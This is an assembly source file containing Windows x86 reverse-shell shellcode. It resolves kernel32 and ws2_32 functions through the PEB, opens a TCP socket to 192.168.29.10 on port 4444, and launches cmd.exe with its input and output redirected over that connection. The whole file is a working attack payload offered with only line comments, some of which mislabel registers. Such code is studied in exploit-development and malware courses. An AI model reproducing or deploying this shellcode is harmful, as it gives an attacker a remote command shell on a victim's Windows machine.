global _start
section .text
_start:


;Get kernel32.dll base address
xor ecx, ecx                                        ; ECX = 0
mul ecx                                             ; EAX = 0
mov eax, [fs:ecx + 0x30]                            ; EAX = PEB
mov eax, [eax + 0xc]                                ; EAX = PEB->Ldr
mov esi, [eax + 0x14]                               ; ESI = PEB->Ldr.InMemOrder
lodsd                                               ; EAX = Second module
xchg eax, esi                                       ; EAX = ESI, ESI = EAX
lodsd                                               ; EAX = Third(kernel32)
mov ebx, [eax + 0x10]                               ; EBX = Base address
mov edi, [ebx + 0x3c]                               ; EDX = DOS->e_lfanew
add edi, ebx                                        ; EDX = PE Header
mov edi, [edi + 0x78]                               ; EDX = Offset export table
add edi, ebx                                        ; EDX = Export table
mov esi, [edi + 0x20]                               ; ESI = Offset names table
add esi, ebx                                        ; ESI = Names table
xor ecx, ecx                                        ; EXC = 0


;get GetProcAddress address
Get_Function:
inc ecx ; ECX = 1
lodsd ; Get name offset
add eax, ebx ; Get function name
cmp dword [eax], 0x50746547 ; GetP
jnz Get_Function
cmp word [eax + 0xa], 0x73736572 ; ress
jnz Get_Function
mov esi, [edi + 0x24] ; ddre
add esi, ebx ; kernel32.dll base address + 4424
mov cx, [esi + ecx * 2] ; ECX = 199
dec ecx ; ECX = 198
mov esi, [edi + 0x1c] ; ESI = 2654
add esi, ebx ; kernel32.dll base address + 2654
mov edi, [esi + ecx * 4]
add edi, ebx


;Locating LoadLibraryA Address
xor ecx, ecx ; ECX = 0
push ecx ; null terminator
push 0x41797261 ; Ayra
push 0x7262694c ; rbiL
push 0x64616f4c ; daoL
push esp ; set pointer to string "LoadLibraryA"
push ebx ; kernel32.dll base address
call edi ; call GetProcAddress(LoadLibraryA)


; Load ws2_32.dll with LoadLibrary
xor ecx, ecx ; ECX = 0
push ecx ; null terminator
mov cx, 0x3233 ; ECX = 23
push ecx ; 23
push 0x5f327377 ; _2sw
push esp ; set pointer to string "ws2_32"
call eax ; call LoadLibrary(ws2_32)
mov ebp, eax ; EBP = ws2_32.dll address


;Get WSAStartup with GetProcAddress
xor ecx, ecx ; ECX = 0
mov cx, 0x7075 ; ECX = 7075
push ecx ; pu
push 0x74726174 ; trat
push 0x53415357 ; SASW
push esp ; set pointer to string "WSAStartup"
push ebp ; ws2_32.dll address
call edi ; call GetProcAddress(WSAStartup)


;Call WSAStartup
xor ecx, ecx ; ECX = 0
mov cx, 0x0190 ; ECX = 190 - size of WSAData struct
sub esp, ecx ; alloc space for WSAData struct
push esp ; set pointer to WSAData struct
push ecx ; push the wVersionRequested parameter
call eax ; call WSAStartup(MAKEWORD(2, 2),
wsadata_pointer)


; get WSASocketA address GetProcAddress
mov ax, 0x4174 ; EAX = 4174
push eax ; tA
push 0x656b636f ; ekco
push 0x53415357 ; SASW
push esp ; set pointer to string "WSASocketA"
push ebp ; ws2_32.dll address
call edi ; call GetProcAddress(WSASocketA)


;call WSASocketA
xor ecx, ecx ; ECX = 0
push ecx ; dwFlags = NULL
push ecx ; g = NULL
push ecx ; lpProtocolInfo = NULL
xor edx, edx ; EDX = 0
mov dl, 6 ; EDX = 6
push edx ; protocol = 6 (TCP)
inc ecx ; ECX = 1
push ecx ; type = 1
inc ecx ; ECX = 2
push ecx ; af = 2
call eax ; call WSASocketA
push eax ; push eax on stack
pop esi ; save eax in esi


; get connect address with GetProcAddress
xor ecx, ecx ; ECX = 0
mov ecx, 0x74636590 ; ECX = 0tce
shr ecx, 8 ; ECX = tce
push ecx ; tce
push 0x6e6e6f63 ; nnoc
push esp ; set pointer to string "connect"
push ebp ; ws2_32.dll address
call edi ; GetProcAddress(connect)


; call connect - initial connection
push 0x0a1da8c0 ; 192.168.29.10
push word 0x5c11 ; 4444
xor ecx, ecx ; ECX = 0
mov cl, 2 ; ECX = 2
push cx ; 2
mov edx, esp
push 0x10 ; 10
push edx
push esi ; results of call WSASocketA
call eax ; call connect


;get CreateProcessA address with GetProcAddress
xor ecx, ecx ; ECX = 0
mov cx, 0x4173 ; CX = 4173
push ecx ; As
push 0x7365636f ; seco
push 0x72506574 ; rPet
push 0x61657243 ; aerC
push esp ; set pointer to string "CreateProcessA"
push ebx ; kernel32.dll base address
call edi
mov ebp, ebx ; move kernel32.dll base into ebp


;Call CreateProcess - get shell
mov edx, 0x646D6390 ; EDX = 646D6390 (dmc0)
shr edx, 8 ; EDX = 00646D63 (dmc)
push edx ; cmd
mov ecx, esp ; move "cmd" to ecx
xor edx, edx ; EDX = 0
sub esp, 16 ; ESP - 16
mov ebx, esp ; move "CreateProcessA" to EBX
push esi ; ESI = 64
push esi ; ESI = 64
push esi ; ESI = 64
push edx ; NULL
push edx ; NULL
inc edx ; EDX = 1
rol edx, 8 ; EDX = 100
inc edx ; EDX = 101
push edx
xor edx, edx ; EDX = 0
push edx ; NULL
push edx ; NULL
push edx ; NULL
push edx ; NULL
push edx ; NULL
push edx ; NULL
push edx ; NULL
push edx ; NULL
push edx ; NULL
push edx ; NULL
add dl, 44 ; EDX = 4
push edx ; 44
mov esi, esp
push ebx
push esi
xor edx, edx ; EDX = 0
push edx ; NULL
push edx ; NULL
push edx ; NULL
xor esi, esi ; ESI = 0
inc esi ; ESI = 1
push esi ; 1
push edx ; NULL
push edx ; NULL
push ecx ; "cmd"
push edx ; NULL
call eax ; call CreateProcessA


; get ExitProcess address with GetProcAddress
xor edx, edx
mov edx, 0x737365 ; EDX = 737365
push edx ; sse
push 0x636f7250 ; corP
push 0x74697845 ; tixE
push esp ; set pointer to string "ExitProcess"
push ebp ; kernel32.dll base address
call edi ; call GetProcAddress(ExitProcess)


; call ExitProcess
xor edx, edx ; EDX = 0
push edx ; NULL
call eax ; call ExitProcess
